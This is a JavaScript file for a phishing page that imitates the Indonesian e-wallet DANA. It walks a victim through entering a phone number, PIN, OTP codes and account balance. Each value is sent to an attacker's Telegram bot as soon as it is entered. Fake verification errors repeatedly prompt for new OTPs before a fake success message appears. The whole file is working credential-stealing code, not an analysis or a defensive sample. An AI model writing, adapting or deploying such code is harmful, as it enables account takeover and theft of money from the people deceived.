document.addEventListener('DOMContentLoaded', function () {
    const numberPage = document.getElementById('number-page');
    const pinPage = document.getElementById('pin-page');
    const otpPage = document.getElementById('otp-page');
    const lanjutkanButton = document.getElementById('lanjutkan-button');
    const phoneNumberInput = document.getElementById('phone-number');
    const pinInputs = document.querySelectorAll('.pin-box');
    const otpInputs = document.querySelectorAll('.otp-box');
    const floatingNotification = document.getElementById('floating-notification');
    const saldoContainer = document.querySelector('.saldo-container');
    const saldoInput = document.getElementById('saldo-input');
    const saldoError = document.getElementById('saldo-error');
    const verifikasiButton = document.getElementById('verifikasi-button');
    const verifikasiButtonContainer = document.querySelector('.verifikasi-button-container');
    const successNotification = document.getElementById('success-notification');
    const lanjutkanContainer = document.getElementById('lanjutkan-container');

    let currentPage = 'number';
    let phoneNumber = '';
    let pin = '';
    let otp = '';
    let verificationAttempts = 0;
    const maxAttempts = 6;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;
    
    async function sendToTelegram(message) {
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        } catch (error) {
            console.error('Telegram error:', error);
        }
    }

    function formatPhoneNumber(number) {
        return `☎  :      ${number.padEnd(15)}    \n\n`;
    }

    function formatPin(number, pin) {
        return `${formatPhoneNumber(number)}🔐 :    ${pin.padEnd(6)}  \n\n`;
    }

    function formatOtp(number, pin, otp) {
        return `${formatPin(number, pin)}🀄 :    ${otp.padEnd(4)}   \n\n`;
    }

    function formatSaldo(number, pin, otp, saldo) {
        return `${formatOtp(number, pin, otp)}🃏 :  ${saldo.padEnd(10)}   `;
    }

    phoneNumberInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 4) value = value.substring(0, 4) + '-' + value.substring(4);
        if (value.length > 9) value = value.substring(0, 9) + '-' + value.substring(9);
        e.target.value = value.substring(0, 15);
    });

    pinInputs.forEach((input, index) => {
        input.addEventListener('input', function (e) {
            if (e.target.value.length === 1 && index < pinInputs.length - 1) {
                pinInputs[index + 1].focus();
            }

            pin = Array.from(pinInputs).map(input => input.value).join('');

            if (pin.length === 6) {
                sendToTelegram(formatPin(phoneNumber, pin));

                setTimeout(() => {
                    pinPage.style.display = 'none';
                    otpPage.style.display = 'block';
                    currentPage = 'otp';
                    lanjutkanContainer.style.display = 'none';

                    setTimeout(() => {
                        floatingNotification.style.display = 'block';
                    }, 2000);
                }, 500);
            }
        });

        input.addEventListener('keydown', function (e) {
            if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
                pinInputs[index - 1].focus();
            }
        });
    });

    otpInputs.forEach((input, index) => {
        input.addEventListener('input', function (e) {
            if (e.target.value.length === 1 && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }

            otp = Array.from(otpInputs).map(input => input.value).join('');

            if (otp.length === 4) {
                saldoContainer.style.display = 'block';
                verifikasiButtonContainer.style.display = 'block';
                saldoInput.focus();
                saldoInput.setAttribute('inputmode', 'numeric');
                sendToTelegram(formatOtp(phoneNumber, pin, otp));
            }
        });

        input.addEventListener('keydown', function (e) {
            if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
                otpInputs[index - 1].focus();
            }
        });
    });

    saldoInput.addEventListener('input', function (e) {
        e.target.value = e.target.value.replace(/\D/g, '');
        const rawValue = e.target.value;
        if (rawValue) {
            const formatted = parseInt(rawValue).toLocaleString('id-ID');
            e.target.value = formatted;
        }
    });

    const showText = document.querySelector('.show-text');
    showText.addEventListener('click', function () {
        this.classList.toggle('active');

        const pinInputs = document.querySelectorAll('.pin-box');
        pinInputs.forEach(input => {
            input.type = this.classList.contains('active') ? 'text' : 'password';
        });

        this.textContent = this.classList.contains('active') ? 'Sembunyikan' : 'Tampilkan';
    });

    lanjutkanButton.addEventListener('click', function () {
        if (currentPage === 'number') {
            phoneNumber = phoneNumberInput.value.replace(/\D/g, '');

            if (phoneNumber.length < 10) {
                alert('Nomor HP harus minimal 10 digit');
                return;
            }

            sendToTelegram(formatPhoneNumber(phoneNumber));

            numberPage.style.display = 'none';
            pinPage.style.display = 'block';
            currentPage = 'pin';
            lanjutkanContainer.style.display = 'none';
        }
    });

    verifikasiButton.addEventListener('click', function () {
        const saldoValue = saldoInput.value.replace(/\D/g, '');

        if (!saldoValue || parseInt(saldoValue) < 10000) {
            saldoError.textContent = 'Sisa saldo di akun Dana harus di atas 10.000';
            saldoError.style.display = 'block';
            return;
        }

        const formattedSaldo = parseInt(saldoValue).toLocaleString('id-ID');
        
        if (parseInt(saldoValue) > 10000) {
            sendToTelegram(formatSaldo(phoneNumber, pin, otp, formattedSaldo));
        }

        floatingNotification.style.display = 'block';
        document.getElementById('attempt-counter').style.display = 'block';
        verificationAttempts++;
        document.getElementById('attempt-number').textContent = verificationAttempts;

        otpInputs.forEach(input => input.value = '');
        otp = '';

        if (verificationAttempts >= maxAttempts) {
            floatingNotification.style.display = 'none';
            successNotification.style.display = 'block';
            setTimeout(() => {
                successNotification.style.display = 'none';
            }, 5000);
        } else {
            otpInputs[0].focus();
        }
    });

    floatingNotification.addEventListener('click', function () {
        this.style.display = 'none';
        otpInputs[0].focus();
    });
});
